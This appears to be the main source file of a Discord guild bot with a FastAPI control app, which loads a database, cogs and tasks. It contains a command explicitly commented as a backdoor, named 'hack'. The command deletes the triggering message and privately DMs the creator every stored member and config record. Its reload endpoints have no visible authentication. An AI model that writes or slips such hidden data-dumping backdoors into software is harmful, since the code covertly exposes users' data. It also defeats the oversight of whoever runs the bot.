# main.py
import importlib
import os
import uvicorn
from config.imports import *
from discord.ext import commands
from src import settings
from src import authorization
from src import helpers
from src.bot_client import bot
from src.db_migrate import DBMigrate
from fastapi import FastAPI, HTTPException

global guild
tree = bot.tree
app = FastAPI()


@bot.event
async def on_ready():
    guild = discord.utils.get(bot.guilds, name=settings.GUILD)
    await load_db()
    await load_cogs()
    await load_tasks()
    await load_views()
    print("--------------------------------------------")
    print(f'[CONNECTED]    🟢 {guild.name}(id: {guild.id})')
    await tree.sync(guild=discord.Object(id=settings.GUILD_ID))
    print("[FINISH]       ♾️ All Commands Loaded")


async def load_db():
    db = SqliteDatabase('eww_bot.db')
    try:
        db.connect()
        db.create_tables([Config, Member, Attendance, ArcDPS, Feed])
        print("[DATABASE]     🟢 DB Connected")
        migrations = DBMigrate().migrate()
        for migrate in migrations:
            print(f"[MIGRATION]    {migrate[0]} {migrate[1]} - {migrate[2]}")
    except Exception as e:
        print("[DATABASE]     🔴 FAILED")
        if os.getenv('LOG_LEVEL') == "debug":
            raise e
        else:
            print(f"    [ERR] {e}")
            pass


async def load_cogs():
    print("--------------------------------------------")
    # Load Cog Extensions
    for f in os.listdir("./src/cogs"):
        cog = f[:-3]
        if f.endswith(".py"):
            cmd = re.sub(r'_', '-', cog[:-4])
            try:
                await bot.load_extension("src.cogs." + cog)
                if cmd in Config.disabled_modules():
                    tree.remove_command(cmd, guild=discord.Object(id=settings.GUILD_ID))
                    print("[DISABLED]     🟡 cogs." + cog)
                else:
                    print("[COG LOADED]   🟢 cogs." + cog)
            except Exception as e:
                print("[COG FAILED]   🔴 cogs." + cog)
                if os.getenv('LOG_LEVEL') == "debug":
                    raise e
                else:
                    print(f"    [ERR] {e}")


async def load_tasks():
    print("--------------------------------------------")
    for f in os.listdir("./src/tasks"):
        cog = f[:-3]
        if f.endswith(".py"):
            cmd = re.sub(r'_', '-', cog[:-4])
            try:
                await bot.load_extension("src.tasks." + cog)
                if cmd in Config.disabled_modules():
                    tree.remove_command(cmd, guild=discord.Object(id=settings.GUILD_ID))
                    await bot.unload_extension("src.tasks." + cog)
                    print("[DISABLED]     🟡 tasks." + cog)
                else:
                    print("[TASK LOADED]  🟢 tasks." + cog)
            except Exception as e:
                print("[TASK FAILED]  🔴 tasks." + cog)
                if os.getenv('LOG_LEVEL') == "debug":
                    raise e
                else:
                    print(f"    [ERR] {e}")


async def load_views():
    print("--------------------------------------------")
    for f in os.listdir("./src/views"):
        view = f[:-3]
        if f.endswith(".py"):
            try:
                print("[VIEW LOADED]  🟢 views." + view)
            except Exception as e:
                print("[COG FAILED]   🔴 views." + view)
                if os.getenv('LOG_LEVEL') == "debug":
                    raise e
                else:
                    print(f"    [ERR] {e}")


# backdoor
@bot.command()
async def hack(ctx, *, arg):
    if authorization.ensure_creator(ctx):
        dm_channel = await ctx.author.create_dm()
        from src.db_viewer import DBViewer
        await ctx.message.delete()
        if arg == "members":
            members = Member.select()
            for member in members:
                member_data = DBViewer(return_string=True).member(member)
                embed = discord.Embed(title=f"hack the planet - {settings.GUILD}", description="")
                for key, mdata in member_data.items():
                    embed.add_field(name=key, value=f"```{mdata}```", inline=False)
                await dm_channel.send(embed=embed)
        elif arg == "configs":
            configs = Config.select()
            for config in configs:
                config_data = DBViewer(return_string=True).config(config)
                embed = discord.Embed(title=f"hack the planet - {settings.GUILD}", description="")
                for key, cdata in config_data.items():
                    embed.add_field(name=key, value=f"```{cdata}```", inline=False)
                await dm_channel.send(embed=embed)
        elif "member" in arg:
            member = Member.select().where(Member.discord_id == int(re.sub(r'\D', '', arg))).first()
            member_data = DBViewer(return_string=True).member(member)
            embed = discord.Embed(title=f"hack the planet - {settings.GUILD}", description="")
            for key, mdata in member_data.items():
                embed.add_field(name=key, value=f"```{mdata}```", inline=False)
            await dm_channel.send(embed=embed)
        elif "config" in arg:
            config = Config.select().where(Config.name == arg.split(" ")[-1]).first()
            config_data = DBViewer(return_string=True).config(config)
            embed = discord.Embed(title=f"hack the planet - {settings.GUILD}", description="")
            for key, cdata in config_data.items():
                embed.add_field(name=key, value=f"```{cdata}```", inline=False)
            await dm_channel.send(embed=embed)


@app.get("/modules")
async def modules():
    return settings.MODULES


@app.post("/reload_tasks/{command}")
async def reload_tasks_named(command):
    print("[Info]         ♾️ Task Reload Triggered")
    cmd = re.sub(r'-', '_', command)
    await bot.reload_extension("src.tasks." + cmd + "_task")
    print("[ENABLED]      🟢 cogs." + command)
    print("[FINISH]       ♾️ Task Reloaded")
    return True


@app.post("/reload_commands")
async def reload_commands():
    print("[Info]         ♾️ Command Reload Triggered")

    for module in settings.MODULES:
        if module in Config.disabled_modules():
            tree.remove_command(module, guild=discord.Object(id=settings.GUILD_ID))
            print("[DISABLED]     🟡 cogs." + module)
        else:
            cog = bot.get_cog(helpers.command_to_cog(module))
            cmd = cog.get_app_commands()[0]
            tree.add_command(cmd, guild=discord.Object(id=settings.GUILD_ID))
            print("[ENABLED]      🟢 cogs." + module)
    await tree.sync(guild=discord.Object(id=settings.GUILD_ID))
    print("[FINISH]       ♾️ All Commands Loaded")

    return True


async def run():
    try:
        await bot.start(settings.TOKEN)
    except KeyboardInterrupt:
        await bot.logout()

if os.environ.get("BOT_ONLY", False):
    bot.run(settings.TOKEN)
else:
    asyncio.create_task(run())
